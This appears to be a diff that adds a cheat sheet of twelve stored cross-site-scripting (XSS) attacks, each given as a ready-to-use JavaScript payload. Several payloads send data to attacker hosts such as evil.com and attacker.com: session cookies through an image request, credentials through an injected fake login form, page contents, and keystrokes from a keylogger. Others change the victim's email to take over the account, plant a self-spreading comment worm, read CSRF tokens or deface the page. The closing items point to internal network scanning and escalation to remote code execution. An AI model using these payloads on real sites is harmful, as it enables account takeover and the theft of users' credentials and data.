@@ -1,0 +1,77 @@
+1. Full Account Takeover (without stealing cookies)
+
+fetch("/changeEmail", {
+  method: "POST",
+  credentials: "include",
+  body: "email=hacker@evil.com"
+})
+
+🍪 2. Session Cookie Theft
+
+new Image().src = "http://attacker.com/steal?c=" + document.cookie;
+
+
+🎣 3. Stored phishing attack (fake forms injected)
+
+document.body.innerHTML = "<h2>Session expired. Login again</h2>" +
+   "<form action='http://evil.com/steal' method='POST'>" +
+   "<input name='username'><input name='password'>" +
+   "</form>";
+
+✉️ 4. Sending malicious messages to all users (worm behavior)
+
+fetch("/newComment", {
+  method: "POST",
+  body: "<script>... worm code ...</script>"
+});
+
+🔔 5. Push notifications / alerts to admins
+
+<script>fetch('http://evil.com/adminSeen')</script>
+
+🕵️ 6. Stealing sensitive user data
+
+fetch("http://evil.com/exfil?data=" +
+      encodeURIComponent(document.body.innerText));
+
+🔐 7. Stealing CSRF tokens
+
+<input type="hidden" name="csrf_token" value="Xyz123">
+
+token = document.querySelector("[name=csrf_token]").value;
+
+⌨️ 8. Keylogging
+
+document.onkeyup = e => {
+  fetch("http://evil.com/log?key=" + e.key);
+};
+
+
+🎯 9. Defacement (changing content/UI)
+
+document.querySelector("h1").innerText = "Hacked by XSS";
+
+
+📁 10. Reading internal files (if access exists)
+If the page displays logs, error messages, or user info, XSS can steal them.
+
+🌐 11. Internal network attacks (admin perspective)
+If admin panel loads IPs, internal hostnames, or intranet URLs, XSS can:
+
+Port-scan internal network
+
+Access internal endpoints
+
+Exploit internal apps
+
+🧨 12. Stored XSS → Command Injection (indirect)
+
+If admin panel auto-executes or logs user input into a shell command,
+chain into:
+
+RCE
+
+File write
+
+SQL injection
+
